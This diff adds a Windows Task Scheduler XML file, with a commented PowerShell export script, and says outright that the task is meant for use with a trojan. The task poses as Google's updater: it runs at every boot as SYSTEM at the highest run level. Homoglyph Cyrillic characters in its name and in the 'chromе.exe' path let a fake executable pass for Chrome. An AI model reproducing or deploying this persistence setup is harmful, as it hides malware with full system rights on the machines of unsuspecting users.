@@ -1,0 +1,59 @@
+<!-- 
+=======================================================================
+The following script exports a Task Scheduler task into XML format,
+which can be edited to be used with the trojan malware.
+
+Note that it requires running with an Administrator account to succeed.
+
+The PowerShell command `Export-ScheduledPath` is more accessible,
+but I did not discover this until afterwards.
+
+** Adapted from a script provided by ChatGPT. **
+=======================================================================
+
+$taskFolder = "\"
+$taskName = "GoogleSystem\GoogleUpdater\GoogleUpdaterTaskSystem140.0.7273.0{DD2BAB31-B49A-4981-BB41-9C83CB6B6235}"
+$outputPath = "C:\Users\admin\Downloads\GoogleUpdaterTaskSystemFake.xml"
+
+$taskService = New-Object -ComObject "Schedule.Service"
+$taskService.Connect()
+
+# Get the task from the root folder
+$taskFolder = $taskService.GetFolder($taskFolder)
+$task = $taskFolder.GetTask($taskName)
+
+# Export the task's XML definition
+[System.IO.File]::WriteAllText($outputPath, $task.Xml, [System.Text.Encoding]::Unicode)
+-->
+
+<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+    <RegistrationInfo>
+        <Author>NT AUTHORITY\SYSTEM</Author>
+        <Description>GoogleUpdater Task System 87.0.4280.141</Description>
+        <URI>\GooglеUpdaterTaskSystem87.0.4280.141{DD2BAB31-B49A-4981-BB41-9C83CB6B6235}</URI>
+    </RegistrationInfo>
+    <Principals>
+        <Principal id="Author">
+            <UserId>S-1-5-18</UserId>
+            <RunLevel>HighestAvailable</RunLevel>
+        </Principal>
+    </Principals>
+    <Settings>
+        <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+        <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+        <MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy>
+        <IdleSettings>
+            <StopOnIdleEnd>false</StopOnIdleEnd>
+            <RestartOnIdle>false</RestartOnIdle>
+        </IdleSettings>
+    </Settings>
+    <Triggers>
+        <BootTrigger />
+    </Triggers>
+    <Actions Context="Author">
+        <Exec>
+            <Command>"C:\Program Files\Google\Chrome\Application\chromе.exe"</Command>
+        </Exec>
+    </Actions>
+</Task>
